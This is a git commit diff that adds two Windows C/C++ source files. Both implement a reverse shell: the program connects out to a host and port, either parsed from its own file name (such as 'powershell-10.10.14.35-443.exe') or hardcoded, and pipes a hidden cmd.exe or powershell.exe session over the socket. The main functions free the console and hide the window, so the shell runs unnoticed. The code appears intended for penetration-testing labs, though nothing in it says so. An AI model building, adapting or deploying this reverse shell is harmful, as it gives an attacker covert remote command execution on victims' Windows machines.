f91d8ca58ae65c9823b5cc62336375905330e14a
starvii <starvii@gmail.com>
2025-01-23 16:17:12 +0800

    test

---
+++ byname/rev.cpp
@@ -0,0 +1,308 @@
+﻿#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
+// Windows Header Files
+#include <windows.h>
+#include <tchar.h>
+#include <process.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+
+// reverse windows shell by filename
+// powershell-10.10.14.35-443.exe // using powershell.exe to reverse
+// <other_name>-10.10.14.35-443.exe // using cmd.exe
+
+using namespace std;
+
+
+inline static BOOL file_exists(PCTSTR path) {
+    //HANDLE hFile = INVALID_HANDLE_VALUE;
+    BOOL ret = FALSE;
+    const auto hFile = CreateFile(
+        path,
+        GENERIC_READ,
+        FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE,
+        nullptr,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        nullptr
+    );
+    if (hFile != INVALID_HANDLE_VALUE) {
+        ret = TRUE;
+        CloseHandle(hFile);
+    }
+    return ret;
+}
+
+static SIZE_T $strlen(const TCHAR* str) {
+    BYTE* p = (BYTE*)str;
+    SIZE_T i = 0;
+    while (*p != 0) {
+        i++;
+        p++;
+    }
+    return i;
+}
+
+static int $is_whitespace(char c) {
+    return (c == ' ' || c == '\t' || c == '\n' || c == '\r' || c == '\f' || c == '\v');
+}
+
+static int $strtrim(PCTSTR str, LPSTR out) {
+    if (str == nullptr || out == nullptr) return -ERROR_INVALID_ADDRESS;
+
+    // jump left spaces
+    const char* start = str;
+    while (*start != '\0' && $is_whitespace(*start)) {
+        start++;
+    }
+
+    // all spaces or null string
+    if (*start == '\0') {
+        *out = _T('\0');
+        return 0;
+    }
+
+    // jump right spaces
+    const char* end = str + strlen(str) - 1;
+    while (end > start && $is_whitespace(*end)) {
+        end--;
+    }
+
+    // length of new string
+    size_t length = end - start + 1;
+
+    // malloc new 
+    //char* result = malloc(length + 1); // +1 用于 '\0'
+    //if (result == NULL) return NULL;
+
+    // copy one by one
+    for (size_t i = 0; i < length; i++) {
+        out[i] = start[i];
+    }
+    out[length] = '\0';
+
+    return 0;
+}
+
+static int $print(_In_ PCTSTR text) {
+    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+    DWORD charsWritten = 0;
+    if (hConsole == INVALID_HANDLE_VALUE) {
+        return (INT32)hConsole;
+    }
+    return WriteConsole(hConsole, text, $strlen(text), &charsWritten, NULL) | FlushConsoleInputBuffer(hConsole);
+}
+
+static void $memcpy(void* dst, const void* src, size_t len) {
+    BYTE* pd = (BYTE*)dst;
+    const BYTE* ps = (const BYTE*)src;
+    for (size_t i = 0; i < len; i++) {
+        pd[i] = ps[i];
+    }
+}
+
+static void _lower(LPSTR str) {
+    for (auto i = 0; i < $strlen(str); i++) {
+        auto ch = str[i];
+        if (ch >= _T('A') && ch <= _T('Z')) {
+            str[i] = ch + (_T('a') - _T('A'));
+        }
+    }
+}
+
+namespace rev {
+    //const PCTSTR PATH$POWERSHELL = R"(C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe)";
+    //const PCTSTR PATH$CMD = R"(C:\WINDOWS\SYSTEM32\CMD.EXE)";
+
+    static int extract(_In_ PCTSTR cmdline, _Out_ PTSTR szCmd, _Out_ PTSTR host, _Out_ PTSTR szPort, _Out_ UINT16& port) {
+        int retCode = ERROR_SUCCESS;
+        const auto len = $strlen(cmdline);
+
+        const auto buffer_length = ((len + 1) / 8 + 1) * 8;
+        const auto buffer = static_cast<TCHAR*>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buffer_length << 1u));
+        if (nullptr == buffer) {
+            retCode = ERROR_NOT_ENOUGH_MEMORY;
+            goto __ERROR__;
+        }
+        {
+            const auto tmp_buf = buffer + buffer_length;
+
+            $strtrim(cmdline, tmp_buf);
+
+            const auto l1 = tmp_buf[0];
+            const auto r1 = tmp_buf[$strlen(tmp_buf) - 1];
+            auto start_index = l1 == _T('"') || l1 == _T('\'') ? 1 : 0;
+            auto end_index = r1 == _T('"') || r1 == _T('\'') ? $strlen(tmp_buf) - 1 : $strlen(tmp_buf);
+
+            $memcpy(buffer, tmp_buf + start_index, end_index - start_index);
+        }
+        {
+            // read file check exist
+            const auto bRet = file_exists(buffer);
+            if (!bRet) {
+                retCode = ERROR_FILE_NOT_FOUND;
+                goto __ERROR__;
+            }
+        }
+        {
+            // remove ".exe"
+            const auto bl = $strlen(buffer);
+            _lower(buffer);
+            if (buffer[bl - 4] == _T('.') &&
+                buffer[bl - 3] == _T('e') &&
+                buffer[bl - 2] == _T('x') &&
+                buffer[bl - 1] == _T('e')) {
+                buffer[bl - 4] = _T('\0');
+            }
+            else {
+                retCode = ERROR_DATA_NOT_ACCEPTED;
+                goto __ERROR__;
+            }
+        }
+        // extract port:
+        {
+            SSIZE_T hyphens[2]{ -1, -1 };
+            const auto bl = $strlen(buffer);
+            size_t idx = 0;
+            for (auto i = 0; i < bl; i++) {
+                const auto j = bl - 1 - i;
+                const auto ch = buffer[j];
+                if (ch == _T('-')) {
+                    hyphens[idx] = j;
+                    idx += 1;
+                    if (idx >= 2) {
+                        break;
+                    }
+                }
+            }
+            if (hyphens[0] < 7 || hyphens[1] < 0 || hyphens[0] <= hyphens[1]) {
+                return ERROR_DATA_NOT_ACCEPTED;
+            }
+            UINT64 p = 0;
+            for (auto i = hyphens[0] + 1; i < bl; i++) {
+                const auto ch = buffer[i];
+                if (ch < _T('0') || ch > _T('9')) {
+                    return ERROR_DATA_NOT_ACCEPTED;
+                }
+                p = p * 10 + ch - _T('0');
+            }
+            if (p <= 0 || p > 65535) {
+                return ERROR_DATA_NOT_ACCEPTED;
+            }
+            port = static_cast<UINT16>(p);
+            $memcpy(szPort, buffer + hyphens[0] + 1, bl - hyphens[0]);
+            $memcpy(host, buffer + hyphens[1] + 1, hyphens[0] - hyphens[1] - 1);
+
+            const auto j = hyphens[1];
+            if (j >= 10 &&
+                buffer[j - 10] == _T('p') &&
+                buffer[j - 9] == _T('o') &&
+                buffer[j - 8] == _T('w') &&
+                buffer[j - 7] == _T('e') &&
+                buffer[j - 6] == _T('r') &&
+                buffer[j - 5] == _T('s') &&
+                buffer[j - 4] == _T('h') &&
+                buffer[j - 3] == _T('e') &&
+                buffer[j - 2] == _T('l') &&
+                buffer[j - 1] == _T('l')
+                ) {
+                szCmd[0] = _T('p');
+                szCmd[1] = _T('o');
+                szCmd[2] = _T('w');
+                szCmd[3] = _T('e');
+                szCmd[4] = _T('r');
+                szCmd[5] = _T('s');
+                szCmd[6] = _T('h');
+                szCmd[7] = _T('e');
+                szCmd[8] = _T('l');
+                szCmd[9] = _T('l');
+                szCmd[10] = _T('.');
+                szCmd[11] = _T('e');
+                szCmd[12] = _T('x');
+                szCmd[13] = _T('e');
+                szCmd[14] = _T('\0');
+            }
+            else {
+                szCmd[0] = _T('c');
+                szCmd[1] = _T('m');
+                szCmd[2] = _T('d');
+                szCmd[3] = _T('.');
+                szCmd[4] = _T('e');
+                szCmd[5] = _T('x');
+                szCmd[6] = _T('e');
+                szCmd[7] = _T('\0');
+            }
+        }
+
+
+        goto __FREE__;
+    __ERROR__:
+        do {} while (0);
+    __FREE__:
+        if (nullptr != buffer) {
+            HeapFree(GetProcessHeap(), 0, buffer);
+        }
+        return retCode;
+    }
+
+    static int reverse(PCTSTR cmd, PCTSTR host, PCTSTR port) {
+        FreeConsole();
+
+        LPSTR $cmd = nullptr;
+        $memcpy(&$cmd, &cmd, sizeof(PVOID));
+
+        WSADATA wsaData;
+        int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+        struct addrinfo* result = nullptr, * ptr = nullptr, hints;
+        ZeroMemory(&hints, sizeof(hints));
+        hints.ai_family = AF_UNSPEC;
+        hints.ai_socktype = SOCK_STREAM;
+        hints.ai_protocol = IPPROTO_TCP;
+        getaddrinfo(host, port, &hints, &result);
+        ptr = result;
+        SOCKET ConnectSocket = WSASocket(
+            ptr->ai_family,
+            ptr->ai_socktype,
+            ptr->ai_protocol,
+            nullptr, 0, 0
+        );
+        connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
+        STARTUPINFO si;
+        PROCESS_INFORMATION pi;
+        ZeroMemory(&si, sizeof(si));
+        si.cb = sizeof(si);
+        ZeroMemory(&pi, sizeof(pi));
+        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        si.hStdInput = (HANDLE)ConnectSocket;
+        si.hStdOutput = (HANDLE)ConnectSocket;
+        si.hStdError = (HANDLE)ConnectSocket;
+        CreateProcess(nullptr, $cmd, nullptr, nullptr, TRUE, 0, nullptr, nullptr, &si, &pi);
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        WSACleanup();
+        return 0;
+    }
+}
+
+int main() {
+    const auto cmdline = GetCommandLine();
+    const auto len = $strlen(cmdline);
+    const auto buffer_length = ((len + 1) / 8 + 1) * 8;
+
+    auto buffer = static_cast<LPSTR>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buffer_length << 2u));
+    if (nullptr == buffer) {
+        return ERROR_NOT_ENOUGH_MEMORY;
+    }
+    LPSTR szHost = buffer;
+    LPSTR szPort = buffer + buffer_length;
+    LPSTR szCmd = buffer + buffer_length * 2;
+    UINT16 u16Port = 0;
+
+    auto retCode = rev::extract(cmdline, szCmd, szHost, szPort, u16Port);
+    if (retCode == ERROR_SUCCESS) {
+        retCode |= rev::reverse(szCmd, szHost, szPort);
+    }
+    HeapFree(GetProcessHeap(), 0, buffer);
+    return retCode;
+}
---
+++ simple/rev.c
@@ -0,0 +1,391 @@
+﻿
+#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
+// Windows Header Files
+#include <windows.h>
+#include <tchar.h>
+#include <process.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#pragma comment(lib, "Ws2_32.lib")
+
+//static TCHAR g$szExecute[MAX_PATH << 2u];
+//static TCHAR g$szHost[MAX_PATH << 2u];
+//static TCHAR g$szPort[16];
+//static UINT16 g$uPort;
+//static HANDLE g$hFile = INVALID_HANDLE_VALUE;
+
+//static errno_t __cdecl $_tcscpy_s(char* dest, size_t destSize, const char* src) {
+//    if (dest == NULL || src == NULL || destSize == 0 || destSize > RSIZE_MAX) {
+//        if (dest != NULL && destSize > 0) {
+//            dest[0] = _T('\0'); // 清空目标缓冲区
+//        }
+//        return EINVAL; // 无效参数
+//    }
+//
+//    size_t i;
+//    for (i = 0; i < destSize; i++) {
+//        dest[i] = src[i];
+//        if (src[i] == _T('\0')) {
+//            return 0; // 成功
+//        }
+//    }
+//
+//    dest[0] = _T('\0'); // 清空目标缓冲区
+//    return ERANGE;  // 缓冲区溢出
+//}
+
+//static int print(_In_ PCTSTR text) {
+//    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+//    DWORD charsWritten = 0;
+//    if (hConsole == INVALID_HANDLE_VALUE) {
+//        return (INT32)hConsole;
+//    }
+//    return WriteConsole(hConsole, text, _tcslen(text), &charsWritten, NULL) | FlushConsoleInputBuffer(hConsole);
+//}
+
+
+//void* _memcpy(void* dst, const void* src, size_t len) {
+//    BYTE* pd = (BYTE*)dst;
+//    const BYTE* ps = (const BYTE*)src;
+//    for (size_t i = 0; i < len; i++) {
+//        pd[i] = ps[i];
+//    }
+//    return dst;
+//}
+//
+//void _memset(void* buf, BYTE val, size_t len) {
+//    BYTE* pd = (BYTE*)buf;
+//    for (size_t i = 0; i < len; i++) {
+//        pd[i] = val;
+//    }
+//}
+//
+//void _bzero(void* buf, size_t len) {
+//    _memset(buf, 0, len);
+//}
+
+//static void log_to_file(PCTSTR text) {
+//    INT32 retCode = ERROR_SUCCESS;
+//    HANDLE hFile = INVALID_HANDLE_VALUE;
+//    DWORD bytesWritten;
+//    BOOL bRet;
+//
+//    hFile = CreateFile(
+//        "debug.log",
+//        GENERIC_WRITE,
+//        FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE,
+//        NULL,
+//        OPEN_ALWAYS,
+//        FILE_ATTRIBUTE_NORMAL,
+//        NULL
+//    );
+//    if (hFile == INVALID_HANDLE_VALUE) {
+//        retCode = ERROR_OPEN_FAILED;
+//        goto __ERROR__;
+//    }
+//    bRet = WriteFile(hFile, text, _tcslen(text), &bytesWritten, NULL);
+//    if (!bRet) {
+//        retCode = ERROR_WRITE_FAULT;
+//        goto __ERROR__;
+//    }
+//
+//    goto __FREE__;
+//__ERROR__:
+//    do {} while (0);
+//__FREE__:
+//    if (hFile != INVALID_HANDLE_VALUE) {
+//        CloseHandle(hFile);
+//        hFile = INVALID_HANDLE_VALUE;
+//    }
+//}
+
+//static int print_help() {
+//    TCHAR* text = NULL;
+//
+//    text = _T("Usage:\n");
+//    print(text);
+//    text = _T("\trev.exe <ip> <port>\n");
+//    print(text);
+//    text = _T("\trev.exe <ip>:<port>\n");
+//    print(text);
+//    text = _T("\tor write connection config at end of rev.exe, such as [echo '10.10.10.10:4444' >> rev.exe]\n\n");
+//    print(text);
+//    return 0;
+//}
+
+//static int find_execute(_In_ PCTSTR cmdline) {
+//    if (NULL == cmdline) {
+//        return -ERROR_INVALID_ADDRESS;
+//    }
+//    TCHAR buffer[MAX_PATH << 2u];
+//    for (int i = 0; i < _tcslen(cmdline); i++) {
+//        TCHAR ch = cmdline[i];
+//        if (ch == _T(' ')) {
+//            _bzero(buffer, sizeof(buffer));
+//            if (i + 1 > sizeof(buffer)) {
+//                return -ERROR_BUFFER_OVERFLOW;
+//            }
+//            _memcpy(buffer, cmdline, i);
+//            g$hFile = CreateFile(
+//                buffer,
+//                GENERIC_READ,
+//                FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE,
+//                NULL,
+//                OPEN_EXISTING,
+//                FILE_ATTRIBUTE_NORMAL,
+//                NULL
+//            );
+//            if (g$hFile != INVALID_HANDLE_VALUE) {
+//                if (i + 1 > sizeof(g$szExecute)) {
+//                    return -ERROR_BUFFER_OVERFLOW;
+//                }
+//                _bzero(g$szExecute, sizeof(g$szExecute));
+//                _memcpy(g$szExecute, cmdline, i);
+//                return i;
+//            }
+//        }
+//    }
+//    return -1;
+//}
+
+//static int parse_arguments(_In_ PCTSTR arguments) {
+//    if (NULL == arguments) {
+//        return -ERROR_INVALID_ADDRESS;
+//    }
+//    TCHAR buffer[MAX_PATH << 2u];
+//    TCHAR* start = NULL;
+//    for (int i = 0; i < _tcslen(arguments); i++) {
+//        if (arguments[i] != _T(' ')) {
+//            start = arguments + i;
+//        }
+//    } // delete the left space characters
+//    if (!start) {
+//        return -ERROR_DATA_NOT_ACCEPTED;
+//    }
+//    if (_tcslen(start) + 1 > sizeof(buffer)) {
+//        return -ERROR_BUFFER_OVERFLOW;
+//    }
+//    _bzero(buffer, sizeof(buffer));
+//    _memcpy(buffer, start, _tcslen(start));
+//    for (int i = _tcslen(buffer) - 1; i > -1; i--) {
+//        if (buffer[i] == _T(' ')) {
+//            buffer[i] = _T('\0');
+//        }
+//    } // delete the right space characters
+//    int split_index = -1;
+//    for (int i = 0; i < _tcslen(buffer); i++) {
+//        TCHAR ch = buffer[i];
+//        if (ch == _T(':') || ch == _T(' ')) {
+//            split_index = i;
+//            break;
+//        }
+//    }
+//    if (split_index <= 0) {
+//        return -ERROR_BUFFER_OVERFLOW;
+//    }
+//    {
+//        if (split_index + 1 > sizeof(g$szHost)) {
+//            return -ERROR_BUFFER_OVERFLOW;
+//        }
+//
+//        _bzero(g$szHost, sizeof(g$szHost));
+//        _memcpy(g$szHost, buffer, split_index);
+//    }
+//    {
+//        TCHAR* p = buffer + split_index + 1;
+//        for (int i = split_index + 1; i < _tcslen(buffer); i++) {
+//            if (buffer[i] != _T(' ')) {
+//                p = buffer + i;
+//                break;
+//            }
+//        }
+//        if (_tcslen(p) > sizeof(g$szPort)) {
+//            return -ERROR_BUFFER_OVERFLOW;
+//        }
+//        _bzero(g$szPort, sizeof(g$szPort));
+//        UINT64 m = 0;
+//        for (int j = 0; j < _tcslen(p); j++) {
+//            TCHAR ch = p[j];
+//            if (ch < _T('0') || ch > _T('9')) {
+//                return -ERROR_DATA_NOT_ACCEPTED;
+//            }
+//            m = m * 10 + ch - _T('0');
+//            g$szPort[j] = ch;
+//        }
+//        if (m > 65535) {
+//            return -ERROR_DATA_NOT_ACCEPTED;
+//        }
+//        g$uPort = (UINT16)m;
+//    }
+//    return 0;
+//}
+
+//static int parse_config(_In_ PCTSTR cmdline) {
+//    int retCode = -1;
+//    int idx = find_execute(cmdline);
+//    if (idx > 0) {
+//        if (idx < _tcslen(cmdline)) {
+//            // there are some arguments
+//            retCode = parse_arguments(cmdline + idx + 1);
+//        }
+//    }
+//    if (0 != retCode && g$hFile != INVALID_HANDLE_VALUE) {
+//        TCHAR buffer[MAX_PATH];
+//        _bzero(buffer, sizeof(buffer));
+//        // 获取文件大小
+//        LARGE_INTEGER fileSize;
+//        if (!GetFileSizeEx(g$hFile, &fileSize)) {
+//            return retCode;
+//        }
+//        DWORD bytesToRead = 1024;
+//        if (fileSize.QuadPart < bytesToRead) {
+//            bytesToRead = fileSize.LowPart;
+//        }
+//        // 移动文件指针到倒数第 1024 字节处
+//        LARGE_INTEGER offset;
+//        offset.QuadPart = -(LONGLONG)(bytesToRead);
+//        if (SetFilePointerEx(g$hFile, offset, NULL, FILE_END) == INVALID_SET_FILE_POINTER) {
+//            return retCode;
+//        }
+//        DWORD bytesRead;
+//        if (!ReadFile(g$hFile, buffer, bytesToRead, &bytesRead, NULL)) {
+//            return retCode;
+//        }
+//        TCHAR* start = buffer;
+//        for (int i = sizeof(buffer) - 1; i > -1; i--) {
+//            TCHAR c = buffer[i];
+//            if (c == _T(' ') || c == _T(':') || c == _T('.') || (c >= _T('A') && c <= _T('Z')) || (c >= _T('a') && c <= _T('z')) || (c >= _T('0') && c <= _T('9'))) {
+//                continue;
+//            }
+//            start = buffer + i;
+//            break;
+//        }
+//        retCode = parse_arguments(cmdline + idx + 1);
+//    }
+//    return retCode;
+//}
+
+//static INT32 parse_command_arguments() {
+//    TCHAR* start = NULL, * end = NULL, * port_start = NULL;
+//    BOOL overflow = FALSE;
+//    if (g_argc == 2) {
+//        // split by [:]
+//        start = g_argv[1];
+//        for (int i = 0; i < _tcslen(start); i++) {
+//            TCHAR ch = start[i];
+//            if (ch == _T(':')) {
+//                end = start + i;
+//                port_start = end + 1;
+//                break;
+//            }
+//        }
+//    }
+//    else if (g_argc == 3) {
+//        // split by [ ]
+//        start = g_argv[1];
+//        end = start + _tcslen(start);
+//        port_start = g_argv[2];
+//    }
+//    else {
+//        return -1;
+//    }
+//    ZeroMemory(g_host, sizeof(g_host));
+//    for (int i = 0; i < end - start; i++) {
+//        if (_tcslen(g_host) >= sizeof(g_host) - 1) {
+//            overflow = TRUE;
+//            break;
+//        }
+//        g_host[i] = start[i];
+//    }
+//    if (overflow) {
+//        return -2;
+//    }
+//    UINT64 m = 0;
+//    //g_port = 0;
+//    for (int i = 0; i < _tcslen(port_start); i++) {
+//        TCHAR ch = port_start[i];
+//        if (ch < _T('0') || ch > _T('9')) {
+//            return -3;
+//        }
+//        m = m * 10 + (ch - _T('0'));
+//    }
+//    if (m > 65535) {
+//        return -4;
+//    }
+//    g_port = (UINT16)m;
+//    $_tcscpy_s(g_port_s, sizeof(g_port_s), port_start);
+//    return 0;
+//}
+//
+//
+//static INT32 parse_file_arguments() {
+//    TCHAR buffer[64];
+//    TCHAR* filename = g_argv[0];
+//    return 0;
+//}
+
+static int reverse(PCTSTR host, PCTSTR port) {
+    FreeConsole();
+    WSADATA wsaData;
+    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+    struct addrinfo* result = NULL, * ptr = NULL, hints;
+    ZeroMemory(&hints, sizeof(hints));
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+    getaddrinfo(host, port, &hints, &result);
+    ptr = result;
+    SOCKET ConnectSocket = WSASocket(
+        ptr->ai_family, 
+        ptr->ai_socktype, 
+        ptr->ai_protocol,
+        NULL, 0, 0
+    );
+    connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    si.hStdInput = (HANDLE)ConnectSocket;
+    si.hStdOutput = (HANDLE)ConnectSocket;
+    si.hStdError = (HANDLE)ConnectSocket;
+    TCHAR cmd[] = _T("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
+    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    WSACleanup();
+    return 0;
+}
+
+
+int main() {
+    //PCTSTR cmdline = GetCommandLine();
+
+
+    //for (int i = 0; i < argc; i++) {
+    //    print(argv[i]);
+    //}
+
+    //g_argc = argc;
+    //g_argv = argv;
+    //INT32 retCode = 0;
+    //
+    //if (g_argc > 1) {
+    //    retCode = parse_command_arguments();
+    //}
+    //else {
+    //    retCode = parse_file_arguments();
+    //}
+    //int retCode = parse_config(cmdline);
+    //if (0 == retCode) {
+    return reverse("255.255.255.255", "65536");
+    //}
+    //else {
+        //print_help();
+        //return retCode;
+    //}
+}
